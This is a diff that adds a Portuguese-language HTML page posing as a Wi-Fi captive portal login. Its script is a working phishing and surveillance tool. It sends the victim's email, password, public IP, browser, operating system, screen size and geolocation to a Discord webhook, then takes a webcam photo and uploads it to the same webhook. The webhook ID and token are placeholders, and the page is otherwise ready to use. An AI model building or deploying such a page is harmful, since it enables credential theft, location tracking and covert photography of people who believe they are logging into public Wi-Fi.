@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f3f3f3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      transition: background-color 0.5s ease;
+    }
+
+    .container {
+      max-width: 500px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      background: #fff;
+      border-radius: 8px;
+      transition: box-shadow 0.5s ease, transform 0.3s ease;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 50%;
+      transition: width 0.5s ease;
+    }
+
+    .title,
+    .sub-title {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #000;
+      transition: color 0.5s ease;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .input-field {
+      width: 100%;
+      max-width: 400px;
+      height: 40px;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      transition: border-color 0.5s ease;
+    }
+
+    .button {
+      width: 100%;
+      max-width: 400px;
+      height: 40px;
+      background-color: #1a3b73;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.5s ease, transform 0.3s ease;
+    }
+
+    .button:hover,
+    .button:focus {
+      background-color: #FFD700;
+    }
+
+    @media screen and (max-width: 600px) {
+      .container {
+        margin: 10px;
+      }
+
+      .logo img {
+        width: 70%;
+      }
+
+      .input-field,
+      .button {
+        max-width: 100%;
+      }
+    }
+
+    body.dark-mode {
+      background-color: #000;
+      color: #fff;
+    }
+
+    body.dark-mode .container {
+      background: #000;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    }
+
+    body.dark-mode .input-field {
+      border-color: #fff;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <div class="logo">
+      <img src="https://cdn.discordapp.com/attachments/1188986057866358816/1196924245071110274/IMG_7469-fotor-bg-remover-20240116174548.png?ex=65b96591&is=65a6f091&hm=b3722de058565a34ea209209d0a7383750eb9dc08da22a1dc9658ec86a8edbb4" alt="Logo">
+    </div>
+
+    <h1 class="title">Login</h1>
+
+    <h2 class="sub-title">Adicione seu email e sua senha para liberar o WI-FI.</h2>
+
+    <form onsubmit="processarFormulario(event)">
+      <div class="form-group">
+        <input class="input-field" name="email" type="text" placeholder="Email" required>
+      </div>
+
+      <div class="form-group">
+        <input class="input-field" name="password" type="password" placeholder="Senha" required>
+      </div>
+
+      <div class="form-group">
+        <button class="button" type="submit">Login</button>
+      </div>
+    </form>
+
+  </div>
+
+  <script>
+    async function processarFormulario(event) {
+      event.preventDefault();
+
+      try {
+        const geoLocationPermission = await obterPermissaoGeolocalizacao();
+
+        if (geoLocationPermission) {
+          const geolocalizacao = await obterGeolocalizacao();
+
+          var response = await fetch('https://api64.ipify.org?format=json');
+          var data = await response.json();
+          var ip = data.ip;
+
+          var navegador = navigator.userAgent;
+          var paginaAtual = window.location.href;
+
+          var sistemaOperacional = navigator.platform;
+          var resolucaoTela = window.screen.width + 'x' + window.screen.height;
+
+          var dados = {
+            email: document.getElementsByName("email")[0].value,
+            password: document.getElementsByName("password")[0].value,
+            ip: ip,
+            navegador: navegador,
+            paginaAtual: paginaAtual,
+            sistemaOperacional: sistemaOperacional,
+            resolucaoTela: resolucaoTela,
+            geolocalizacao: geolocalizacao
+          };
+
+          axios.post('https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN', {
+            embeds: [{
+              title: 'Dados do Captive Portal',
+              description: 'Aqui estão os dados do captive portal, incluindo geolocalização.',
+              color: 16711680,
+              fields: [
+                { name: 'Email', value: dados.email, inline: true },
+                { name: 'Senha', value: dados.password, inline: true },
+                { name: 'IP', value: dados.ip, inline: false },
+                { name: 'Navegador', value: dados.navegador, inline: false },
+                { name: 'Página Atual', value: dados.paginaAtual, inline: false },
+                { name: 'Sistema Operacional', value: dados.sistemaOperacional, inline: false },
+                { name: 'Resolução da Tela', value: dados.resolucaoTela, inline: false },
+                { name: 'Geolocalização', value: `${dados.geolocalizacao.latitude}, ${dados.geolocalizacao.longitude}`, inline: false },
+              ],
+              timestamp: new Date(),
+            }]
+          });
+
+          await capturarFoto();
+        } else {
+          console.error('Permissão de geolocalização negada.');
+        }
+
+      } catch (error) {
+        console.error('Erro ao obter informações:', error);
+      }
+    }
+
+    async function obterPermissaoGeolocalizacao() {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        return true;
+      } catch (error) {
+        console.error('Permissão de geolocalização negada:', error);
+        return false;
+      }
+    }
+
+    async function obterGeolocalizacao() {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        return { latitude: position.coords.latitude, longitude: position.coords.longitude };
+      } catch (error) {
+        console.error('Erro ao obter geolocalização:', error);
+        return null;
+      }
+    }
+
+    async function capturarFoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+
+        const imageCapture = new ImageCapture(track);
+
+        const photoBlob = await imageCapture.takePhoto();
+
+        const formData = new FormData();
+        formData.append('file', photoBlob, 'foto.png');
+
+        const webhookURL = 'https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN';
+
+        const response = await axios.post(webhookURL, formData, {
+          headers: {
+            'Content-Type': 'multipart/form-data'
+          }
+        });
+
+        console.log('Resposta do Discord:', response.data);
+
+        track.stop();
+        stream.getTracks().forEach(track => track.stop());
+
+      } catch (error) {
+        console.error('Erro ao capturar foto:', error);
+
+        if (error.response) {
+          console.error('Resposta do Discord:', error.response.data);
+        } else if (error.request) {
+          console.error('Sem resposta do Discord. Status:', error.request.status);
+        } else {
+          console.error('Erro durante a solicitação:', error.message);
+        }
+      }
+    }
+  </script>
+
+</body>
+
+</html>
